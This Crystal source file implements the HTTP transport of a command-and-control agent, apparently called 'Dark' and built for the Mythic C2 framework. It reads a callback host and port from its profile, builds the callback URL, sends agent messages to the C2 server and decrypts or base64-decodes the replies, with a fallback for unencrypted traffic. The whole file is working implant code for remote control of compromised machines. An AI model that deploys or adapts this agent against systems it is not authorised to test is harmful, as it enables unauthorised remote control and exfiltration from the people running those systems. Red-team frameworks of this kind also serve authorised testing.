require "http/client"
require "json"
require "base64"
require "./base"
require "../config"

module Dark::Agent::Transport
  # HTTP profile implementation compatible with Mythic C2
  class HTTP < Base
    # Make it a singleton so we can access it from outside
    @@instance : HTTP?

    # HTTP-specific headers
    @headers : Hash(String, String) = {} of String => String

    # INITIALIZATION

    def self.instance : HTTP
      @@instance.not_nil!
    end

    def initialize(config : Config::Base)
      super(config)
      @@instance = self

      # Initialize HTTP-specific config
      @headers = {} of String => String
      parse_headers_from_config

      if @config.has_encryption?
        log_debug("HTTP Transport initialized with encryption enabled")
      else
        log_debug("HTTP Transport initialized with ENCRYPTION DISABLED")
      end
    end

    # Parse HTTP headers from profile configuration
    private def parse_headers_from_config
      begin
        c2_profile = @config.c2_profile

        if c2_profile.as_h? && c2_profile["headers"]?
          headers = c2_profile["headers"]

          if headers.as_h?
            # If headers is already a hash, use it directly
            headers.as_h.each do |k, v|
              @headers[k.to_s] = v.to_s
            end
          elsif headers.as_s?
            # If it's a string, try to parse it as JSON
            headers_json = headers.as_s
            if !headers_json.empty? && headers_json != "{}"
              additional_headers = JSON.parse(headers_json)
              if additional_headers.as_h?
                additional_headers.as_h.each do |k, v|
                  @headers[k.to_s] = v.to_s
                end
              end
            end
          end
        end
      rescue ex
        log_error("Failed to parse HTTP headers: #{ex.message}")
      end
    end

    # MYTHIC TRANSPORT IMPLEMENTATION

    # Implementation of send_request method required by Base class
    #
    # Mythic communication: Sends data to C2 using standard HTTP transport
    protected def send_request(message : String) : {::HTTP::Client::Response?, String?}
      _, url, http_headers = create_http_client
      send_http_request(url, http_headers, message)
    end

    # Implementation of process_response required by Base class
    #
    # Mythic communication: Processes and decrypts responses from C2 server
    protected def process_response(raw_body : String) : String
      return "" if raw_body.empty?

      begin
        if @config.has_encryption?
          # Try processing directly first
          result = decrypt_message(raw_body)
          return result unless result.empty?

          # If that fails, maybe it's binary that needs base64 encoding
          response_base64 = Base64.strict_encode(raw_body.to_slice)
          return decrypt_message(response_base64)
        else
          # For unencrypted responses
          decoded_bytes = Base64.decode(raw_body)
          return decoded_bytes.size > 36 ? String.new(decoded_bytes[36..]) : ""
        end
      rescue ex
        log_error("Error processing response: #{ex.message}")
        return ""
      end
    end

    # HTTP TRANSPORT HELPERS

    # Helper to create and prepare HTTP client with full URL
    private def create_http_client : {::HTTP::Client, String, ::HTTP::Headers}
      # Get post URI path from profile
      path = ""
      if @config.c2_profile["post_uri"]?
        path = @config.c2_profile["post_uri"].as_s
      end

      # Just create a dummy client for compatibility
      client = ::HTTP::Client.new("localhost", 80)

      # Build URL
      url = build_full_url(path)

      # Create headers
      http_headers = ::HTTP::Headers.new
      @headers.each { |k, v| http_headers[k] = v }

      {client, url, http_headers}
    end

    # Implementation of build_full_url required by Base class
    #
    # Builds the full URL for C2 communication from profile settings
    protected def build_full_url(path : String) : String
      host = @config.c2_profile["callback_host"].to_s
      port = @config.c2_profile["callback_port"].to_s
      "#{host}:#{port}/#{path}"
    end
  end
end